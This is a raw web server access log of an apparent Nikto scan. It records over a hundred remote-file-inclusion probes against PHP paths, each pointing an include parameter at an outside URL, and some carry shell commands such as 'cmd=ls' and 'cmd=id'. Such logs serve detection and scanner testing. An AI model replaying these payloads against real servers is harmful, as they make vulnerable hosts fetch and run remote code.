172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /poll/view.php?int_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005655)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pollvote.php?pollNikto=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005656)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pollvote.php?pollname=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005656)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /pop.php?base=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005657)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /popup_window.php?site_isp_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005658)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /popup_window.php?site_isp_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005659)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /port.php?content=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005660)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /portal/includes/portal_block.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005661)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /portal/portal.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005662)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /portfolio.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005663)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /portfolio/commentaires/derniers_commentaires.php?rep=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005664)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /post_static_0-11/_lib/fckeditor/upload_config.php?DDS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 540 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005665)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /prepare.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005666)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /prepare.php?xcart_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005667)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005668)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /preview.php?php_script_path=http://cirt.net/rfiinc.txt??&cmd=dir HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005669)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /principal.php?conteudo=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005670)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /print.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005671)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /print.php?pager=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005672)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /print.php?print=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005673)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /process.php?DEFAULT_SKIN=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005674)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /professeurs/index.php?repertoire_config=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005675)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /profil.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005676)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /projects/weatimages/demo/index.php?ini[langpack]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005677)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /promocms/newspublish/include.php?path[bdocroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005678)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /protection.php?logout_page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005679)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /provider/auth.php?xcart_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005680)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /provider/auth.php?xcart_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005681)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /psynch/nph-psa.exe?css=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005682)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /psynch/nph-psf.exe?css=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005683)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /public_html/add-ons/modules/sysmanager/plugins/install.plugin.php?AURORA_MODULES_FOLDER=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005684)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /public_html/modules/Forums/favorites.php?nuke_bb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005685)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /public_includes/pub_blocks/activecontent.php?vsDragonRootPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005686)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005687)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /qsgen_0.7.2c/qlib/smarty.inc.php?CONFIG[gameroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005688)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /qsgen_0.7.2c/server_request.php?CONFIG[gameroot]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005689)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /qte_web.php?qte_web_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005690)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /quick_reply.php?phpbb_root_path=http://cirt.net/rfiinc.txt?&mode=[file] HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005691)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /quickie.php?QUICK_PATH=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005692)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /random2.php?path_to_folder=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005693)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /randshop/index.php?incl=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005694)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rdf.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005695)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /reactivate.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005696)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /read.php?data=http://cirt.net/rfiinc.txt?? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /readmore.php?config[\\\"sipssys\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005698)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /recent.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005699)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rechnung.php?_PHPLIB[libdir]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005700)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /reconfig.php?GLOBALS[CLPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005701)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /redaxo/include/addons/import_export/pages/index.inc.php?REX[INCLUDE_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005702)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /redirect.php?url=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005703)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /redsys/404.php?REDSYS[MYPATH][TEMPLATES]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005704)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /register.php?base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005705)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /releasenote.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rempass.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005707)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /report.php?scriptpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005708)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /reports/who_r.php?bj=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005709)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /resources/includes/class.Smarty.php?cfg[sys][base_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005710)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /ressourcen/dbopen.php?home=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005711)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /robotstats.inc.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005712)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /root/public/code/cp_html2txt.php?page=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005713)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /routines/fieldValidation.php?jssShopFileSystem=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005714)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rspa/framework/Controller_v4.php?__ClassPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005715)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rspa/framework/Controller_v4.php?__ClassPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005716)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005717)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005718)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rss.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005719)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rss.php?phpraid_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005720)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rss.php?premodDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005721)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /rss2.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005722)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /run.php?dir=SHELL?&file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005723)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /s01.php?shopid=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005724)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /s01.php?shopid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005725)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /s02.php?shopid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005726)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /s03.php?shopid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005727)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /s04.php?shopid=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005728)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sablonlar/gunaysoft/gunaysoft.php?icerikyolu=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005729)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sablonlar/gunaysoft/gunaysoft.php?sayfaid=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005730)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /saf/lib/PEAR/PhpDocumentor/Documentation/tests/559668.php?FORUM[LIB]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005731)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /saf/lib/PEAR/PhpDocumentor/Documentation/tests/559668.php?FORUM[LIB]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005732)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /sample/xls2mysql/parser_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005733)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /save.php?file_save=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005734)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /saveserver.php?thisdir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005735)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script//ident/index.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005736)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/_conf/core/common-tpl-vars.php?confdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005737)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/common.inc.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005738)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/gestion/index.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005739)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/ident/disconnect.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005740)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/ident/ident.inc.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005741)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/ident/identification.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005742)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/ident/loginliste.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005743)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/ident/loginmodif.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005744)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/index.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005745)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/init/createallimagecache.php?PATH_TO_CODE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005746)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/menu/menuadministration.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005747)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/menu/menuprincipal.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005748)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/param/param.inc.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005749)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/plugins/phpgacl/admin/index.php?path_inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005750)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/template/index.php?main_page_directory=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005751)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/tick/allincludefortick.php?PATH_TO_CODE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005752)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script/tick/test.php?PATH_TO_CODE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005753)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script_path/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 558 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005754)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script_path/cms/classes/openengine/filepool.php?oe_classpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005755)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script_path/installation/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005756)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /script_path/pgvnuke/pgvindex.php?DOCUMENT_ROOT/header.php=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005757)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/check-lom.php?ETCDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005758)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/gallery.scr.php?GLOBALS[PTH][func]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005759)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/lom_update.php?ETCDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005760)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/news.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005761)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/polls.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005762)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/rss.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005763)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/search.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005764)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/sitemap.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005765)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/sitemap.scr.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005766)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/weigh_keywords.php?ETCDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005767)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /scripts/xtextarea.scr.php?GLOBALS[PTH][spaw]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005768)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /search.php?config[\\\"sipssys\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005769)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /search.php?id=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005770)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /search.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005771)"
